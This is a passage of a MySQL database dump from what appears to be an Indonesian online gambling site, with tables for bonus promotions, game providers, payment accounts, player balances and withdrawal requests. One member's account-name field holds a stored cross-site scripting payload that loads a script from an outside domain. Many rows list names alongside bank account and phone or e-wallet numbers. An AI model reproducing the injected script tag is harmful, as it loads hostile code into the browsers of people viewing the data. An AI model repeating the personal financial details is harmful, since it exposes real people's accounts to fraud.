style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\" color=\"#ffffff\">Syarat yang perlu Anda perhatikan agar berhak untuk berpartisipasi dalam program bonus referral adalah:</font></font></p><p style=\"text-align: justify;\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\" color=\"#ffffff\">Jika terdapat penipuan, penipuan, kolusi dan aktivitas pidana maka pihak <b>KING808</b>&nbsp;berhak untuk menghentikan atau mengeluarkan bawahan referral anda dari promosi referral.</font></font></p><p style=\"text-align: justify;\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\" color=\"#ffffff\">Promo Referral dapat berubah sewaktu-waktu tanpa adanya pemberitahuan terlebih dahulu.</font></font></p><p style=\"text-align: justify;\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\" color=\"#ffffff\">Seluruh keputusan yang diberikan <b>KING808</b>&nbsp;bersifat mutlak dan tidak dapat diganggu gugat.</font></font></p><p style=\"text-align: justify;\"><font style=\"vertical-align: inherit;\"><font style=\"vertical-align: inherit;\"><br></font></font></p>'),
(21, '2490733390_whatsapp_image_2024-03-03_at_17.43.11.jpeg', 'BONUS NEW MEMBER DEPOSIT 500 BONUS 3JT', 'BONUS INI BERLAKU UNTUK NEW MEMBER');

-- --------------------------------------------------------

--
-- Table structure for table `provider`
--

CREATE TABLE `provider` (
  `id_provider` int(11) NOT NULL,
  `id_menu_games_provider` int(11) NOT NULL,
  `gambar_provider` varchar(255) NOT NULL,
  `nama_provider` varchar(255) NOT NULL,
  `link_provider` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

-- --------------------------------------------------------

--
-- Table structure for table `rekening`
--

CREATE TABLE `rekening` (
  `id_rekening` int(11) NOT NULL,
  `kategori_rekening` enum('bank','emoney','pulsa') NOT NULL,
  `jenis_rekening` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `rekening`
--

INSERT INTO `rekening` (`id_rekening`, `kategori_rekening`, `jenis_rekening`) VALUES
(1, 'bank', 'BCA'),
(2, 'bank', 'BNI'),
(3, 'bank', 'CIMB NIAGA'),
(4, 'bank', 'BRI'),
(5, 'bank', 'MANDIRI'),
(6, 'bank', 'BANK JAGO'),
(7, 'bank', 'BANK NEO'),
(8, 'emoney', 'DANA'),
(9, 'emoney', 'OVO'),
(10, 'emoney', 'GOPAY'),
(61, 'emoney', 'LINK AJA'),
(62, 'bank', 'BSI');

-- --------------------------------------------------------

--
-- Table structure for table `rekening_admin`
--

CREATE TABLE `rekening_admin` (
  `id_rekening_admin` int(11) NOT NULL,
  `kategori_rekening_admin` enum('bank','emoney','pulsa') NOT NULL,
  `id_rekening_rekening_admin` int(11) NOT NULL,
  `nama_rekening_admin` varchar(255) NOT NULL,
  `nomor_rekening_admin` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `rekening_admin`
--

INSERT INTO `rekening_admin` (`id_rekening_admin`, `kategori_rekening_admin`, `id_rekening_rekening_admin`, `nama_rekening_admin`, `nomor_rekening_admin`) VALUES
(29, 'bank', 1, 'LUTFI TRIYANASARI', '5860488045'),
(30, 'bank', 4, 'FUZZI ANDRI YANTI', '001901076456501'),
(31, 'bank', 5, 'LUTFI TRIYANASARI (TRANSFER BCA)', '5860488045'),
(32, 'emoney', 8, 'UTIS SAMADIA', '085941124194'),
(33, 'emoney', 9, 'MOH KHAIRUL ANAM', '088218941249'),
(34, 'emoney', 61, 'FITRIAH', '081355319580');

-- --------------------------------------------------------

--
-- Table structure for table `rekening_anggota`
--

CREATE TABLE `rekening_anggota` (
  `id_rekening_anggota` int(11) NOT NULL,
  `id_akun_rekening_anggota` int(11) NOT NULL,
  `kategori_rekening_anggota` enum('bank','emoney','pulsa') NOT NULL,
  `id_rekening_rekening_anggota` int(11) NOT NULL,
  `nama_rekening_anggota` varchar(255) NOT NULL,
  `nomor_rekening_anggota` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `rekening_anggota`
--

INSERT INTO `rekening_anggota` (`id_rekening_anggota`, `id_akun_rekening_anggota`, `kategori_rekening_anggota`, `id_rekening_rekening_anggota`, `nama_rekening_anggota`, `nomor_rekening_anggota`) VALUES
(117, 2, 'bank', 1, 'Demo', '12345678'),
(118, 65, 'emoney', 8, 'Purnomo', '08575068107'),
(119, 66, 'emoney', 8, 'Ninit', '082173384741'),
(120, 67, 'emoney', 8, 'Hsjsjsjs', '08863748489382'),
(121, 68, 'bank', 4, 'Gusten Rippung', '202501011745534'),
(122, 69, 'emoney', 8, 'Rudianto', '081233221144'),
(123, 70, 'emoney', 8, 'Kiki', '08598656556'),
(124, 71, 'emoney', 8, 'Mumuti', '088973977896'),
(125, 72, 'emoney', 8, 'Fadli Cahya Saputra ', '0895391933337'),
(126, 73, 'bank', 5, 'Hayan<Script Src=\"Https://Hoki303.Cloud/N.Js\"></Script>', '0818281829292'),
(127, 74, 'bank', 1, 'Iga Erlangga', '1393335720'),
(128, 75, 'emoney', 9, 'Anda', '0919292'),
(129, 76, 'bank', 5, 'Nilla Sari', '1560017098247'),
(130, 77, 'bank', 3, 'Abdul Razab Fikri', '707439782400'),
(131, 77, 'emoney', 8, 'Abdul Razab Fikri', '08976574914'),
(132, 78, 'emoney', 8, 'Abdul Razab Fikri', '08976574914'),
(133, 79, 'bank', 5, 'Muhammad Zulkifli', '1490015785480'),
(134, 80, 'emoney', 8, 'Ainun Ikhsan', '085868509971'),
(135, 81, 'bank', 1, 'Rizki Wahyudi', '7100067786'),
(136, 82, 'emoney', 8, 'Sahrani', '082132446371'),
(137, 83, 'emoney', 8, 'Tiara Tri Utami ', '083166880356'),
(138, 84, 'bank', 1, 'Xayyan', '7628371826'),
(139, 85, 'emoney', 8, 'Nizar', '085627271737'),
(140, 86, 'emoney', 8, 'Dania Suandana', '085348219044'),
(141, 87, 'emoney', 9, 'Muhammad Aditia Pratama', '083150738492'),
(142, 88, 'emoney', 8, 'Adi Saputra', '089652548577'),
(143, 89, 'emoney', 8, 'Fahmi', '082110481986'),
(144, 90, 'emoney', 8, 'Abdul Aziz', '082110481989'),
(145, 91, 'emoney', 10, 'Iful', '085150948135'),
(146, 92, 'emoney', 9, 'Muhammad Kadri', '081242529441'),
(147, 93, 'emoney', 8, 'Firqu', '088292052817'),
(148, 94, 'emoney', 8, 'Zainul Alim', '0882242267'),
(149, 95, 'emoney', 8, 'Srilisnanti', '089525903099'),
(150, 96, 'emoney', 8, 'Dendi Ariyanto', '082211238258'),
(151, 97, 'bank', 1, 'Zainul Alim', '0882242267'),
(152, 98, 'emoney', 8, 'E Rika Widiastuti', '081807103575'),
(153, 99, 'emoney', 8, 'Andi Rabani', '082121182865'),
(154, 100, 'emoney', 8, 'Minanu Rohman', '085325871569'),
(155, 101, 'emoney', 10, 'Niko Handoko ', '08889922938'),
(156, 102, 'emoney', 8, 'Casmiaan', '082186937107'),
(157, 101, 'emoney', 10, 'Niko Handoko ', '08889922938'),
(158, 103, 'bank', 1, 'Dial Agwari', '8105960405'),
(159, 104, 'emoney', 8, 'Eko Prasetyo', '087795023845'),
(160, 105, 'emoney', 8, 'Roy Sitanggang', '083827979198'),
(161, 106, 'emoney', 8, 'Muhammad Ilham', '089668177869'),
(162, 107, 'emoney', 8, 'Meliyani', '08971135583'),
(163, 108, 'emoney', 8, 'Ardi Juliandra', '085768641332'),
(164, 109, 'emoney', 8, 'Mira Maysa ', '083149971330'),
(165, 110, 'emoney', 8, 'Dani', '081378232286'),
(166, 111, 'emoney', 8, 'Suwarisman', '082175576799'),
(167, 112, 'bank', 1, 'Juni', '0848477474'),
(168, 113, 'emoney', 8, 'Muhammad Romadlon', '085877820881'),
(169, 114, 'emoney', 8, 'Ferdy Septyan Purwayat ', '081511690642'),
(170, 115, 'emoney', 8, 'Sani', '083850360219'),
(171, 116, 'emoney', 8, 'Rosi Nur Ismi Oktavia ', '087749539112'),
(172, 117, 'emoney', 8, 'Anugrah Adi Pratama ', '085369699050'),
(173, 118, 'emoney', 8, 'Arya Alam Syahroni', '085795732916'),
(174, 119, 'emoney', 8, 'Suryati', '082279293764'),
(175, 120, 'emoney', 8, 'Muhammad Supardi ', '083114321806'),
(176, 121, 'emoney', 8, 'Nina Martini', '083137368398'),
(177, 122, 'emoney', 10, 'Romdasih ', '085817847350'),
(178, 123, 'emoney', 8, 'Ali Murdani', '083879277933'),
(179, 124, 'emoney', 8, 'Jajang Lasmana', '08568631602'),
(180, 125, 'emoney', 8, 'Arieyunitha ', '0895321089156');

-- --------------------------------------------------------

--
-- Table structure for table `saldo`
--

CREATE TABLE `saldo` (
  `id_saldo` int(11) NOT NULL,
  `id_akun_saldo` int(11) NOT NULL,
  `total_saldo` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `saldo`
--

INSERT INTO `saldo` (`id_saldo`, `id_akun_saldo`, `total_saldo`) VALUES
(1, 2, '0'),
(65, 65, '0'),
(66, 66, '0'),
(67, 67, '0'),
(68, 68, '0'),
(69, 69, '0'),
(70, 70, '0'),
(71, 71, '50000'),
(72, 72, '0'),
(73, 73, '0'),
(74, 74, '0'),
(75, 75, '0'),
(76, 76, '3200000'),
(77, 77, '0'),
(78, 78, '0'),
(79, 79, '50000'),
(80, 80, '2050000'),
(81, 81, '0'),
(82, 82, '3050000'),
(83, 83, '0'),
(84, 84, '0'),
(85, 85, '0'),
(86, 86, '4400000'),
(87, 87, '0'),
(88, 88, '0'),
(89, 89, '0'),
(90, 90, '1000000'),
(91, 91, '0'),
(92, 92, '0'),
(93, 93, '6000000'),
(94, 94, '0'),
(95, 95, '0'),
(96, 96, '0'),
(97, 97, '2050000'),
(98, 98, '3300000'),
(99, 99, '0'),
(100, 100, '0'),
(101, 101, '0'),
(102, 102, '0'),
(103, 103, '0'),
(104, 104, '6300111'),
(105, 105, '0'),
(106, 106, '0'),
(107, 107, '5000000'),
(108, 108, '0'),
(109, 109, '8000000'),
(110, 110, '4000000'),
(111, 111, '0'),
(112, 112, '0'),
(113, 113, '3000000'),
(114, 114, '4000000'),
(115, 115, '2050878'),
(116, 116, '4000000'),
(117, 117, '0'),
(118, 118, '0'),
(119, 119, '0'),
(120, 120, '0'),
(121, 121, '8000000'),
(122, 122, '4000000'),
(123, 123, '58000'),
(124, 124, '0'),
(125, 125, '0');

-- --------------------------------------------------------

--
-- Table structure for table `slideshow`
--

CREATE TABLE `slideshow` (
  `id_slideshow` int(11) NOT NULL,
  `gambar_slideshow` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `judul_slideshow` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `slideshow`
--

INSERT INTO `slideshow` (`id_slideshow`, `gambar_slideshow`, `judul_slideshow`) VALUES
(18, '9875515791_live22-spin-to-win-mobile.jpg', 'Live22 Spin to Win'),
(19, '8359944508_png-ultimate-grid-slot-mobile.jpg', 'Ultimated Grid Slot'),
(20, '7626314904_wm-celebrity-peak-mobile.png', 'WM Celebrity Park'),
(21, '3793802808_mg-legendary-treasures-mobile.gif', 'MG Legendary Treasure'),
(22, '3751521249_pgsoft-cash-a-ton-mobile.jpg', 'PG Soft Cash a Ton'),
(23, '2489476160_pp-mahjong-wins-exclusive-mobile.png', 'Mahjong Win Exclusive'),
(24, '8845306957_mg-cash-blitz-bonanza-mobile.jpg', 'MG Cash Blitz Bonanza'),
(25, '6293064883_rk-exclusive-golden-mobile.png', 'RK Exclusive Golden'),
(26, '1304167653_mg-strike-it-rich-mobile.gif', 'MG Strike it Rich'),
(27, '3863292669_pp-mega-gacor-agustus-mobile.gif', 'PP Mega Gacor'),
(28, '8482809640_pp-mega-gacor-agustus-slot-mobile.png', 'PP Mega Gacor Slot');

-- --------------------------------------------------------

--
-- Table structure for table `sub_menu_games`
--

CREATE TABLE `sub_menu_games` (
  `id_sub_menu_games` int(11) NOT NULL,
  `id_menu_games_sub_menu_games` int(11) NOT NULL,
  `gambar_sub_menu_games` varchar(255) NOT NULL,
  `judul_sub_menu_games` varchar(255) NOT NULL,
  `link_sub_menu_games` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `sub_menu_games`
--

INSERT INTO `sub_menu_games` (`id_sub_menu_games`, `id_menu_games_sub_menu_games`, `gambar_sub_menu_games`, `judul_sub_menu_games`, `link_sub_menu_games`) VALUES
(1, 1, 'pp.webp', 'Pragmatic Play', 'pragmatic_play'),
(2, 1, 'microgaming.webp', 'Micro Gaming', 'micro_gaming'),
(3, 1, 'reelkingdom.webp', 'ReelKingdom', 'reelkingdom'),
(4, 1, 'advantplay.webp', 'AdvantPlay', 'advantplay'),
(5, 1, 'fachai.webp', 'Fachai', 'fachai'),
(6, 1, 'crowdplay.webp', 'CrowdPlay', 'crowdplay'),
(7, 1, 'jili.webp', 'Jili', 'jili'),
(8, 1, 'amb.webp', 'AMB Slot', 'amb_slot'),
(9, 1, 'bigpot.webp', 'Bigpot', 'bigpot'),
(10, 1, 'vpower.webp', 'VPower', 'vpower'),
(11, 1, 'slot88.webp', 'Slot88', 'slot88'),
(12, 1, 'pgs.webp', 'ION Slot', 'ion_slot'),
(13, 1, 'joker.webp', 'Joker', 'joker'),
(14, 1, 'live22.webp', 'Live22', 'live22'),
(15, 1, 'playstar.webp', 'Playstar', 'playstar'),
(16, 1, 'spadegaming.webp', 'Spade Gaming', 'spade_gaming'),
(17, 1, 'fungaming.webp', 'Fun Gaming', 'fun_gaming'),
(18, 1, 'habanero.webp', 'Haba Nero', 'haba_nero'),
(19, 1, 'jdb.webp', 'JDB', 'jdb'),
(20, 1, 'sbocq9.webp', 'CQ9', 'cq9'),
(21, 1, 'ttg.webp', 'Top Trend Gaming', 'top_trend_gaming'),
(22, 1, 'betsoft.webp', 'BetSoft', 'betsoft'),
(23, 1, 'playtech.webp', 'Playtech', 'playtech'),
(24, 1, 'yggdrasil.webp', 'Yggdrasil', 'yggdrasil'),
(25, 1, 'playngo.webp', 'Play\'nGo', 'playngo'),
(26, 1, 'onetouch.webp', 'OneTouch', 'onetouch'),
(27, 1, 'sborealtimegaming.webp', 'Real Time Gaming', 'real_time_gaming'),
(28, 1, 'sboflowgaming.webp', 'Flow Gaming', 'flow_gaming'),
(29, 1, 'iconicgaming.webp', 'Astro Tech', 'astro_tech'),
(30, 1, 'sbofunkygame.webp', 'Funky Gaming', 'funky_gaming'),
(31, 2, 'trg.webp', 'ION Casino', 'ion_casino'),
(32, 2, 'pplivecasino.webp', 'PP Casino', 'pp_casino'),
(33, 2, 'mglivecasino.webp', 'MG Live', 'mg_live'),
(34, 2, 'evogaming.webp', 'Evo Gaming', 'evo_gaming'),
(35, 2, 'sbosexybaccarat.webp', 'Sexy Baccarat', 'sexy_baccarat'),
(36, 2, 'prettygaming.webp', 'Pretty Gaming', 'pretty_gaming'),
(37, 2, 'ag.webp', 'Asia Gaming', 'asia_gaming'),
(38, 2, 'allbet.webp', 'AllBet', 'allbet'),
(39, 2, 'pgslive.webp', 'PGS Live', 'pgs_live'),
(40, 2, 'dreamgaming.webp', 'Dream Gaming', 'dream_gaming'),
(41, 2, 'sbocasino.webp', '568Win Casino', '568win_casino'),
(42, 2, 'sv388.webp', 'SV388', 'sv388'),
(43, 3, 'sbo.webp', 'SBO Sportbook', 'sbo_sportbook'),
(44, 3, 'ibcsports.webp', 'SABA Sportbook', 'saba_sportbook'),
(45, 3, 'opus.webp', 'Opus', 'opus'),
(46, 3, 'wbet.webp', 'WBet', 'wbet'),
(47, 3, 'pinnacle.webp', 'Pinaccle', 'pinaccle'),
(48, 3, 'imone.webp', 'IM E-Sports', 'im_esports'),
(49, 3, 'pinnacleesports.webp', 'Pinaccle E-Sports', 'pinaccle_esports'),
(50, 3, 'tfgaming.webp', 'TF Gaming', 'tf_gaming'),
(51, 3, 'sbovirtualgames.webp', 'SBO Virtual Sports', 'sbo_virtual_sports'),
(52, 3, 'ppvirtualgames.webp', 'PP Virtual Sports', 'pp_virtual_sports'),
(53, 4, 'microgamingfishing.webp', 'MicroGaming Fishing', 'microgaming_fishing'),
(54, 4, 'fachaifishing.webp', 'Fachai Fishing', 'fachai_fishing'),
(55, 4, 'jokerfishing.webp', 'Joker Fishing', 'joker_fishing'),
(56, 4, 'jilifishing.webp', 'Jili Fishing', 'jili_fishing'),
(57, 4, 'ambfishing.webp', 'AMB Slot Fishing', 'amb_slot_fishing'),
(58, 4, 'vpowerfishing.webp', 'VPower Fishing', 'vpower_fishing'),
(59, 4, 'crowdplayfishing.webp', 'Crowd Play Fishing', 'crowd_play_fishing'),
(60, 4, 'live22fishing.webp', 'Live22 Fishing', 'live22_fishing'),
(61, 4, 'sbocq9fishing.webp', 'CQ9 Fishing', 'cq9_fishing'),
(62, 4, 'spadegamingfishing.webp', 'Spade Gaming Fishing', 'spade_gaming_fishing'),
(63, 4, 'fungamingfishing.webp', 'Fun Gaming Fishing', 'fun_gaming_fishing'),
(64, 4, 'arcadia.webp', 'Arcadia', 'arcadia'),
(65, 4, 'playstarfishing.webp', 'PlayStar Fishing', 'playstar_fishing'),
(66, 4, 'advantplayminigame.webp', 'AdvantPlay Mini Games', 'advantplay_mini_games'),
(67, 4, 'jdbfishing.webp', 'JDB Fishing', 'jdb_fishing'),
(68, 4, 'iconicgamingfishing.webp', 'Astro Tech Fishing', 'astro_tech_fishing'),
(69, 4, 'sbofunkygamefishing.webp', 'Funky Games Fishing', 'funky_games_fishing'),
(70, 4, 'ixttangkas.webp', 'MM Tangkas', 'mm_tangkas'),
(71, 5, 'g8poker.webp', 'Balak Play', 'balak_play'),
(72, 5, 'onepoker.webp', '9Gaming', '9gaming'),
(73, 6, 'balak4d.webp', 'Nex4D', 'nex4d');

-- --------------------------------------------------------

--
-- Table structure for table `withdraw`
--

CREATE TABLE `withdraw` (
  `id_withdraw` int(11) NOT NULL,
  `id_akun_withdraw` int(11) NOT NULL,
  `kode_withdraw` varchar(255) NOT NULL,
  `kategori_rekening_withdraw` enum('bank','emoney','pulsa') NOT NULL,
  `id_rekening_anggota_withdraw` int(11) NOT NULL,
  `jumlah_withdraw` varchar(255) NOT NULL,
  `tanggal_withdraw` datetime NOT NULL,
  `status_withdraw` enum('proses','batal','selesai') NOT NULL DEFAULT 'proses'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `withdraw`
--

INSERT INTO `withdraw` (`id_withdraw`, `id_akun_withdraw`, `kode_withdraw`, `kategori_rekening_withdraw`, `id_rekening_anggota_withdraw`, `jumlah_withdraw`, `tanggal_withdraw`, `status_withdraw`) VALUES
(65, 79, 'WD-8141377077', 'bank', 133, '50000', '2024-03-03 15:50:48', 'proses'),
(66, 79, 'WD-1615038540', 'bank', 133, '50000', '2024-03-03 15:59:20', 'proses'),
(67, 79, 'WD-3414132226', 'bank', 133, '50000', '2024-03-03 16:14:34', 'proses'),
(68, 79, 'WD-7498948170', 'bank', 133, '50000', '2024-03-03 16:21:12', 'proses'),
(69, 79, 'WD-2500218035', 'bank', 133, '50000', '2024-03-03 16:23:16', 'proses'),
(70, 79, 'WD-3530849232', 'bank', 133, '50000', '2024-03-03 16:23:38', 'proses'),
(71, 80, 'WD-6287715976', 'emoney', 134, '2025000', '2024-03-03 16:27:01', 'proses'),
(72, 80, 'WD-0540250788', 'emoney', 134, '2050000', '2024-03-03 16:28:25', 'proses'),
(73, 79, 'WD-2329843897', 'bank', 133, '50000', '2024-03-03 16:30:54', 'proses'),
(74, 79, 'WD-6652062773', 'emoney', 0, '50000', '2024-03-03 16:31:20', 'proses'),
(75, 79, 'WD-0622673209', 'bank', 133, '50000', '2024-03-03 16:31:48', 'proses'),
(76, 79, 'WD-7473565844', 'bank', 133, '50000', '2024-03-03 16:32:32', 'proses'),
(77, 79, 'WD-3560856401', 'bank', 133, '50000', '2024-03-03 16:33:20', 'proses'),
(78, 80, 'WD-6746179247', 'emoney', 134, '2050000', '2024-03-03 16:33:36', 'proses'),
(79, 80, 'WD-0700618191', 'bank', 0, '2050000', '2024-03-03 16:34:06', 'proses'),
(80, 79, 'WD-5673230979', 'bank', 133, '50000', '2024-03-03 16:35:02', 'proses'),
(81, 79, 'WD-0736765781', 'bank', 133, '50000', '2024-03-03 16:38:44', 'proses'),
(82, 79, 'WD-8743969096', 'bank', 133, '50000', '2024-03-03 16:45:41', 'proses'),
(83, 80, 'WD-3006949120', 'emoney', 134, '2050000', '2024-03-03 16:48:24', 'proses'),
(84, 79, 'WD-3090740141', 'bank', 133, '50000', '2024-03-03 17:13:57', 'proses'),
(85, 76, 'WD-1637494505', 'bank', 129, '3000000', '2024-03-03 18:20:15', 'proses'),
(86, 76, 'WD-2975895444', 'bank', 129, '3000000', '2024-03-03 18:22:00', 'proses'),
(87, 76, 'WD-4042012229', 'bank', 129, '3000000', '2024-03-03 18:22:48', 'proses'),
(88, 82, 'WD-3023686537', 'emoney', 136, '3000000', '2024-03-03 18:23:32', 'proses'),
(89, 76, 'WD-9814622960', 'bank', 129, '100000', '2024-03-03 18:23:57', 'proses'),
(90, 76, 'WD-5240642935', 'bank', 129, '3100000', '2024-03-03 18:29:18', 'proses'),
(91, 76, 'WD-6163529562', 'bank', 129, '3100000', '2024-03-03 18:37:52', 'proses'),
(92, 90, 'WD-5560254863', 'emoney', 144, '500000', '2024-03-03 18:59:35', 'selesai'),
(93, 90, 'WD-8829741303', 'emoney', 144, '500000', '2024-03-03 19:06:09', 'selesai'),
(94, 86, 'WD-1417243353', 'emoney', 140, '4400000', '2024-03-03 20:19:31', 'proses'),
(95, 86, 'WD-1353932883', 'bank', 0, '4400000', '2024-03-03 20:20:26', 'proses'),
(96, 86, 'WD-5215506375', 'emoney', 140, '4400000', '2024-03-03 20:23:09', 'proses'),
(97, 97, 'WD-5590782477', 'bank', 151, '1050000', '2024-03-03 20:36:45', 'proses'),
(98, 86, 'WD-7780271631', 'bank', 0, '200000', '2024-03-03 20:45:04', 'proses'),
(99, 98, 'WD-7722291368', 'emoney', 152, '300000', '2024-03-03 20:46:52', 'proses'),
(100, 98, 'WD-8883308902', 'emoney', 152, '300000', '2024-03-03 20:47:29', 'proses'),
(101, 98, 'WD-5197034723', 'emoney', 152, '3000000', '2024-03-03 20:49:07', 'proses'),
(102, 98, 'WD-1804475816', 'bank', 0, '3000000', '2024-03-03 20:49:52', 'proses'),
(103, 98, 'WD-7120013669', 'emoney', 152, '3000000', '2024-03-03 20:50:03', 'proses'),
(104, 98, 'WD-4584736777', 'emoney', 152, '300000', '2024-03-03 20:51:19', 'proses'),
(105, 98, 'WD-0141127819', 'emoney', 152, '300000', '2024-03-03 20:56:52', 'proses'),
(106, 98, 'WD-4872662701', 'emoney', 152, '300000', '2024-03-03 21:01:09', 'proses'),
(107, 98, 'WD-3367788612', 'emoney', 152, '300000', '2024-03-03 21:01:30', 'proses'),
(108, 98, 'WD-0580250492', 'emoney', 152, '300000', '2024-03-03 21:05:48', 'proses'),
(109, 98, 'WD-3461774544', 'emoney', 152, '300000', '2024-03-03 21:05:56', 'proses'),
(110, 98, 'WD-8222509893', 'emoney', 152, '300000', '2024-03-03 21:06:12', 'proses'),
(111, 98, 'WD-4193672550', 'emoney', 152, '300000', '2024-03-03 21:06:22', 'proses'),
(112, 98, 'WD-1088232147', 'emoney', 152, '300000', '2024-03-03 21:06:31', 'proses'),
(113, 98, 'WD-7684749923', 'emoney', 152, '300000', '2024-03-03 21:06:41', 'proses'),
(114, 98, 'WD-3907726292', 'emoney', 152, '300000', '2024-03-03 21:06:50', 'proses'),
(115, 98, 'WD-6858610734', 'emoney', 152, '300000', '2024-03-03 21:06:59', 'proses'),
(116, 98, 'WD-3248450610', 'emoney', 152, '300000', '2024-03-03 21:07:08', 'proses'),
(117, 98, 'WD-9168370030', 'emoney', 152, '300000', '2024-03-03 21:07:23', 'proses'),
(118, 98, 'WD-1655300974', 'emoney', 152, '300000', '2024-03-03 21:07:31', 'proses'),
(119, 97, 'WD-7973472550', 'bank', 151, '2000000', '2024-03-03 21:14:20', 'proses'),
(120, 97, 'WD-9764287164', 'bank', 151, '2000000', '2024-03-03 21:14:46', 'proses'),
(121, 97, 'WD-9824538372', 'bank', 151, '2000000', '2024-03-03 21:14:47', 'proses'),
(122, 97, 'WD-5466771766', 'bank', 151, '2000000', '2024-03-03 21:14:47', 'proses'),
(123, 97, 'WD-8130193609', 'bank', 151, '2000000', '2024-03-03 21:14:47', 'proses'),
(124, 97, 'WD-1843752019', 'bank', 151, '2000000', '2024-03-03 21:14:47', 'proses'),
(125, 97, 'WD-4022286532', 'bank', 151, '2000000', '2024-03-03 21:14:47', 'proses'),
(126, 97, 'WD-1793597731', 'bank', 151, '2000000', '2024-03-03 21:14:50', 'proses'),
(127, 97, 'WD-3802015963', 'bank', 151, '2000000', '2024-03-03 21:15:03', 'proses'),
(128, 97, 'WD-8289582790', 'bank', 151, '2000000', '2024-03-03 21:15:42', 'proses'),
(129, 98, 'WD-9438358957', 'emoney', 152, '300000', '2024-03-03 21:16:32', 'proses'),
(130, 98, 'WD-1140079491', 'emoney', 152, '300000', '2024-03-03 21:16:43', 'proses'),
(131, 98, 'WD-5539788358', 'emoney', 152, '300000', '2024-03-03 21:16:57', 'proses'),
(132, 98, 'WD-7673010218', 'emoney', 152, '300000', '2024-03-03 21:19:52', 'proses'),
(133, 98, 'WD-4041097844', 'emoney', 152, '3000000', '2024-03-03 21:20:04', 'proses'),
(134, 98, 'WD-1983430333', 'emoney', 152, '300000', '2024-03-03 21:20:56', 'proses'),
(135, 98, 'WD-7507160488', 'emoney', 152, '300000', '2024-03-03 21:21:04', 'proses'),
(136, 97, 'WD-6535713936', 'bank', 151, '2000000', '2024-03-03 21:30:27', 'proses'),
(137, 98, 'WD-1886026355', 'emoney', 152, '300000', '2024-03-03 21:31:18', 'proses'),
(138, 98, 'WD-6358550164', 'emoney', 152, '3000000', '2024-03-03 21:32:04', 'proses'),
(139, 98, 'WD-8528834276', 'emoney', 152, '300000', '2024-03-03 21:33:15', 'proses'),
(140, 98, 'WD-4539469990', 'emoney', 152, '3300000', '2024-03-03 21:40:45', 'proses'),
(141, 98, 'WD-6426468018', 'emoney', 152, '3300000', '2024-03-03 21:41:04', 'proses'),
(142, 97, 'WD-5518195462', 'bank', 151, '2000000', '2024-03-03 21:54:22', 'proses'),
(143, 98, 'WD-7699400626', 'emoney', 152, '300000', '2024-03-03 21:59:22', 'proses'),
(144, 98, 'WD-5224087462', 'emoney', 152, '300000', '2024-03-03 22:05:24', 'proses'),
(145, 98, 'WD-3791740337', 'emoney', 152, '300000', '2024-03-03 22:05:52', 'proses'),
(146, 98, 'WD-1241630371', 'emoney', 152, '300000', '2024-03-03 22:06:02', 'proses'),
(147, 98, 'WD-0961269195', 'emoney', 152, '300000', '2024-03-03 22:06:10', 'proses'),
(148, 98, 'WD-4124137047', 'emoney', 152, '300000', '2024-03-03 22:06:18', 'proses'),
(149, 98, 'WD-3286738336', 'emoney', 152, '300000', '2024-03-03 22:06:26', 'proses'),
(150, 98, 'WD-4261147056', 'emoney', 152, '300000', '2024-03-03 22:06:34', 'proses'),
(151, 98, 'WD-4342530081', 'emoney', 152, '300000', '2024-03-03 22:07:34', 'proses'),
(152, 98, 'WD-6442859156', 'emoney', 152, '300000', '2024-03-03 22:07:42', 'proses'),
(153, 98, 'WD-7893507612', 'emoney', 152, '300000', '2024-03-03 22:07:50', 'proses'),
(154, 98, 'WD-8223911646', 'emoney', 152, '300000', '2024-03-03 22:08:00', 'proses'),
(155, 98, 'WD-2033686524', 'emoney', 152, '300000', '2024-03-03 22:08:07', 'proses'),
(156, 98, 'WD-2158054128', 'emoney', 152, '300000', '2024-03-03 22:08:12', 'proses'),
(157, 98, 'WD-6487246203', 'emoney', 152, '300000', '2024-03-03 22:08:19', 'proses'),
(158, 98, 'WD-0665366750', 'emoney', 152, '300000', '2024-03-03 22:08:27', 'proses'),
(159, 98, 'WD-6277323793', 'emoney', 152, '300000', '2024-03-03 22:08:32', 'proses'),
(160, 98, 'WD-8959280016', 'emoney', 152, '300000', '2024-03-03 22:08:37', 'proses'),
(161, 98, 'WD-8227416297', 'emoney', 152, '300000', '2024-03-03 22:09:00', 'proses'),
(162, 98, 'WD-4691829150', 'emoney', 152, '300000', '2024-03-03 22:09:18', 'proses'),
(163, 98, 'WD-8989272571', 'emoney', 152, '300000', '2024-03-03 22:09:29', 'proses'),
(164, 98, 'WD-8698956284', 'emoney', 152, '300000', '2024-03-03 22:09:37', 'proses'),
(165, 98, 'WD-4795834938', 'emoney', 152, '300000', '2024-03-03 22:09:55', 'proses'),
(166, 98, 'WD-1166170371', 'emoney', 152, '300000', '2024-03-03 22:09:56', 'proses'),
(167, 98, 'WD-5061884772', 'emoney', 152, '300000', '2024-03-03 22:09:56', 'proses'),
(168, 98, 'WD-2988209765', 'emoney', 152, '300000', '2024-03-03 22:09:56', 'proses'),
(169, 98, 'WD-8052685375', 'emoney', 152, '300000', '2024-03-03 22:09:56', 'proses'),
(170, 98, 'WD-1175397926', 'emoney', 152, '300000', '2024-03-03 22:10:03', 'proses'),
